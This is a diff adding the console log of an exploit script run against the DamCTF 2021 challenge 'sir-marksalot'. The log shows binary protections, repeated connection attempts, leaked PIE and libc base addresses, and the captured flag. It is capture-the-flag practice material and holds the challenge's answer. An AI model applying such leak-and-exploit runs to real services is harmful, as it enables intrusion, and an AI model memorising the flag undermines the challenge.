@@ -1,0 +1,67 @@
+# ./exploit.py REMOTE=1
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/sir-marksalot'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] '/pwd/datajerk/damctf2021/sir-marksalot/libc6_2.27-3ubuntu1.4_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] pass 1
+[*] rand 8,25
+[*] grue at 26,28
+[*] time check: 11.828737497329712s
+[CRITICAL] cannot backtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 15,15
+[*] grue at 20,31
+[*] time check: 12.619795083999634s
+[*] leak: 0x5626a6d86217
+[*] binary.address: 0x5626a6d85000
+[CRITICAL] cannot backtrack 2
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 29,39
+[*] grue at 8,33
+[*] time check: 3.5773022174835205s
+[*] leak: 0x55bb0247e217
+[*] binary.address: 0x55bb0247d000
+[CRITICAL] cannot forwardtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 8,18
+[*] grue at 34,37
+[*] time check: 13.59969425201416s
+[*] leak: 0x56337368f217
+[*] binary.address: 0x56337368e000
+[CRITICAL] cannot forwardtrack 4
+[*] Closed connection to chals.damctf.xyz port 31314
+[+] Opening connection to chals.damctf.xyz on port 31314: Done
+[*] pass 1
+[*] rand 28,6
+[*] grue at 32,27
+[*] time check: 11.681979417800903s
+[*] leak: 0x55d71063f217
+[*] binary.address: 0x55d71063e000
+[*] time check: 13.095667839050293s
+[*] time check: 18.36238694190979s
+[*] leak: 0x7fad2a0bcaa0
+[*] libc.address: 0x7fad2a03c000
+[*] pass 2
+[*] x,y = 37,25
+[*] rand 37,25
+[*] grue at 3,3
+[*] time check: 23.01918888092041s
+[*] time check: 24.37698793411255s
+[*] time check: 43.02098894119263s
+dam{1n73N710N4LLy_93771n9_3473n_8y_4_9rU3-7H47_w42_9Ru3S0M3}
